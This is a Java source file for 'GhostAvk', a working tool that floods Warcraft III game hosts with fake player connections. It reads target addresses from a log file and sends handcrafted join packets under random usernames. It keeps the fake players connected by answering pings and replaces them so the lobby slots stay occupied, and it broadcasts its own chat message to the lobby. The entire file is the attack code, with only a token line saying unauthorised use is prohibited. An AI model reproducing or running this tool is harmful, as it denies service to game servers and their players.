import java.io.*;
import java.net.*;
import java.nio.*;
import java.util.*;

public class GhostAvk {
	public static String versionName = "ghost-avk1 (https://github.com/XEpUGdjjDfblBwHh/ghost-avk)";

	public static int NUM_CONNECTIONS = 50;
	public static int GAMESTAY_TIME = 10000;
	public static int MAX_TARGETS = 10;
	public static RandomString RANDOM;
	
	public static HashMap<String, Boolean> map;
	public static int numTargets = 0;
	public static long beginTime;
	
	public static void main(String args[]) throws Exception {
		beginTime = System.currentTimeMillis();
		
		if(args.length == 0) {
			System.out.println("usage: GhostAvk logfile [number of connections] [time to stay in game] [maximum targets]");
			return;
		}
		
		if(args.length >= 2) {
			NUM_CONNECTIONS = Integer.parseInt(args[1]);
			
			if(args.length >= 3) {
				GAMESTAY_TIME = Integer.parseInt(args[2]);
				
				if(args.length >= 4) {
					MAX_TARGETS = Integer.parseInt(args[3]);
				}
			}
		}
		
		map = new HashMap<String, Boolean>(); //stores ip+port strings
		RANDOM = new RandomString(12);
		
		while(true) {
			File file = new File(args[0]);
			
			if(file.exists()) {
				BufferedReader in = new BufferedReader(new FileReader(file));
				String line;
				while((line = in.readLine()) != null) {
					String[] parts = line.split("\\|");
					String ip = parts[3];
					int port = Integer.parseInt(parts[4]);
					String ipport = ip + port;
					
					synchronized(map) {
						if(!map.containsKey(ipport) && numTargets < MAX_TARGETS) {
							map.put(ipport, true);
							numTargets++;
							AvkThread athread = new AvkThread(ip, port);
							athread.start();
						}
					}
				}
			
				file.delete();
			}
			
			Thread.sleep(10000);
		}
	}
	
	public static void deleteFromMap(String ipport) {
		synchronized(map) {
			map.remove(ipport);
			numTargets--;
		}
	}
	
	public static long uptime() {
		return System.currentTimeMillis() - beginTime;
	}
}

class AvkThread extends Thread {
	String targetAddressString;
	InetAddress targetAddress;
	int targetPort;
	
	Socket socket = null;
	DataInputStream in;
	DataOutputStream out;
	
	ArrayList<AvkSocket> sockets;

	public AvkThread(String targetAddressString, int targetPort) {
		try {
			this.targetAddress = InetAddress.getByName(targetAddressString);
		} catch(Exception e) {
			e.printStackTrace();
		}
		
		this.targetAddressString = targetAddressString;
		this.targetPort = targetPort;
		sockets = new ArrayList<AvkSocket>();
	}
	
	public void log(String s) {
		System.out.println("[" + targetAddress + ":" + targetPort + "] " + s);
	}
	
	public void run() {
		//initialize sockets
		for(int i = 0; i < GhostAvk.NUM_CONNECTIONS; i++) {
			log("init: Adding new socket (sockets.size=" + sockets.size() + ")");
			AvkSocket socket = new AvkSocket();
			
			if(!socket.startConnect(targetAddress, targetPort, GhostAvk.RANDOM.nextString())) {
				log("Host seems down; returning");
				GhostAvk.deleteFromMap(targetAddressString + targetPort);
				return; //host is down...
			}
			
			socket.finishConnect();
			
			if(!socket.disconnected) {
				sockets.add(socket);
				socket.start();
			} else {
				log("Add failed");
			}
		}
		
		while(true) {
			//check for disconnected sockets
			for(int i = 0; i < sockets.size(); i++) {
				if(sockets.get(i).disconnected) {
					log("Removing disconnected socket: " + i);
					sockets.remove(i);
					i--;
				}
			}
			
			//add sockets if needed
			//some might be rejected, so limit the total number possible to not waste time
			for(int i = 0; i < 2 && sockets.size() < GhostAvk.NUM_CONNECTIONS; i++) {
				log("Adding new socket (sockets.size=" + sockets.size() + ")");
				AvkSocket socket = new AvkSocket();
			
				if(!socket.startConnect(targetAddress, targetPort, GhostAvk.RANDOM.nextString())) {
					log("Host seems down; returning");
					GhostAvk.deleteFromMap(targetAddressString + targetPort);
					return; //host is down...
				}
				
				socket.finishConnect();
			
				if(!socket.disconnected) {
					sockets.add(socket);
					socket.start();
				} else {
					log("Add failed");
				}
			}
			
			//check for old sockets and replace
			for(int i = 0; i < sockets.size(); i++) {
				if(sockets.get(i).oldSocket()) {
					log("Replacing old socket: " + i);
					AvkSocket socket = new AvkSocket();
					
					if(!socket.startConnect(targetAddress, targetPort, GhostAvk.RANDOM.nextString())) {
						log("Host seems down; returning");
						GhostAvk.deleteFromMap(targetAddressString + targetPort);
						return; //host is down...
					}
				
					sockets.get(i).disconnect();
					socket.finishConnect();
					
					if(!socket.disconnected) {
						sockets.set(i, socket);
						socket.start();
					} else {
						log("Replace failed");
						sockets.remove(i);
						i--;
					}
				}
			}
			
			try {
				Thread.sleep(1000);
			} catch(InterruptedException ie) {}
		}
	}
}

class AvkSocket extends Thread {
	Socket socket;
	DataInputStream in;
	DataOutputStream out;
	boolean disconnected = false;
	long timestamp = -1;
	
	byte[] slotinfojoin_packet = null;
	int pid = -1;

	public AvkSocket() {
		timestamp = System.currentTimeMillis();
	}
	
	public boolean oldSocket() {
		return System.currentTimeMillis() - timestamp >= GhostAvk.GAMESTAY_TIME;
	}
	
	//code ported from deny patch on codelain
	public boolean startConnect(InetAddress targetAddress, int targetPort, String username) {
		try {
			byte b1 = 1;
			byte b2 = 20;
		
			socket = new Socket(targetAddress, targetPort);
			out = new DataOutputStream(socket.getOutputStream());
			in = new DataInputStream(socket.getInputStream());
			
			byte[] username_bytes = username.getBytes();
			ByteBuffer buf = ByteBuffer.allocate(26 + username_bytes.length);

			buf.order(ByteOrder.LITTLE_ENDIAN);
			buf.put((byte) 247); //header constant
			buf.put((byte) 30); //reqjoin header
			buf.putShort((short) (30 + username_bytes.length)); // packet length
			buf.put((byte) b1);
			buf.put((byte) 0);
			buf.put((byte) 0);
			buf.put((byte) b2);
			buf.putInt(0); //entry key
			buf.put((byte) 0); //unknown
			buf.putShort((short) 6112); //listen port
			buf.putInt(0); //peer key
			buf.put(username_bytes);
			buf.put((byte) 0); //null terminator for username
			buf.putInt(0); //unknown
			buf.putShort((short) 6112); //internal port
			//buf.putInt(0); //internal IP

			out.write(buf.array());
			out.flush();
		} catch(Exception e) {
			e.printStackTrace();
			disconnected = true;
		}
		
		if(disconnected) return false;
		else return true;
	}
	
	public void finishConnect() {
		if(!disconnected) {
			try {
				out.writeInt(0);
			
				in.readByte(); //header constant
				byte type = in.readByte();
		
				int length1 = unsignedByte(in.readByte());
				int length2 = unsignedByte(in.readByte());
				int length = length1 + length2 * 256;
		
				byte[] read = new byte[length - 4];
				in.read(read);
		
				if(type == 5) { //rejectjoin
					disconnected = true;
				} else if(type == 4) { //slotinfojoin
					slotinfojoin_packet = read; //store it, but do later in new thread
				}
			} catch(Exception e) {
				e.printStackTrace();
				disconnected = true;
			}
		}
	}
	
	public void disconnect() {
		try {
			socket.close();
		} catch(Exception e) {}
		
		disconnected = true;
	}
	
	public void run() {
		try {
			if(slotinfojoin_packet != null) {
				processSlotInfoJoin();
			}
			
			while(!disconnected) {
				in.readByte(); //header constant
				byte type = in.readByte();
			
				int length1 = unsignedByte(in.readByte());
				int length2 = unsignedByte(in.readByte());
				int length = length1 + length2 * 256;
			
				byte[] read = new byte[length - 4];
				in.read(read);
			
				if(type == 1) { //ping
					ByteBuffer buf = ByteBuffer.allocate(8);
					buf.order(ByteOrder.LITTLE_ENDIAN);
					buf.put((byte) 247); //header constant
					buf.put((byte) 70); //pong to host header
					buf.putShort((short) 8); //packet length
					buf.put(read);
				
					out.write(buf.array());
					out.flush();
				} else if(type == 4) { //slotinfojoin
					slotinfojoin_packet = read;
					processSlotInfoJoin();
				}
			}
		} catch(Exception e) {
			disconnected = true;
		}
	}
	
	public void processSlotInfoJoin() throws IOException {
		//first short is size of slotinfo in little endian
		int slotinfo_size = unsignedByte(slotinfojoin_packet[0]) + unsignedByte(slotinfojoin_packet[1]) * 256;
		//pid is the byte after slotinfo
		pid = unsignedByte(slotinfojoin_packet[slotinfo_size + 2]);
		
		//send a message
		sendMessage(GhostAvk.versionName + ". Use on PVPGNs without permission and on battle.net is prohibited. (nc=" + GhostAvk.numTargets + ",up=" + GhostAvk.uptime() + ", pid=" + pid + ")");
	}
	
	public void sendMessage(String message) throws IOException {
		byte[] message_bytes = message.getBytes();
		
		ByteBuffer buf = ByteBuffer.allocate(26 + message_bytes.length);
		buf.order(ByteOrder.LITTLE_ENDIAN);
		buf.put((byte) 247); //header constant
		buf.put((byte) 40); //chat to host header
		buf.putShort((short) (22 + message_bytes.length)); // packet length
		buf.put((byte) 14); //number of to pids
		for(int i = 0; i < 14; i++) {
			buf.put((byte) i); //one to pid
		}
		
		buf.put((byte) pid); //pid
		buf.put((byte) 16); //chat message flag
		buf.put(message_bytes);
		buf.put((byte) 0); //null terminator for message

		out.write(buf.array());
		out.flush();
	}
	
	public int unsignedByte(byte b) {
		return (0x000000FF & ((int)b));
	}
}

//code copied from http://stackoverflow.com/questions/41107/how-to-generate-a-random-alpha-numeric-string-in-java
class RandomString
{
	private static final char[] symbols = new char[36];

	static {
		for (int idx = 0; idx < 10; ++idx)
			symbols[idx] = (char) ('0' + idx);
		for (int idx = 10; idx < 36; ++idx)
			symbols[idx] = (char) ('a' + idx - 10);
	}

	private final Random random = new Random();

	private final char[] buf;

	public RandomString(int length)
	{
		if (length < 1)
			throw new IllegalArgumentException("length < 1: " + length);
		buf = new char[length];
	}

	public String nextString()
	{
		for (int idx = 0; idx < buf.length; ++idx) 
			buf[idx] = symbols[random.nextInt(symbols.length)];
		return new String(buf);
	}
}
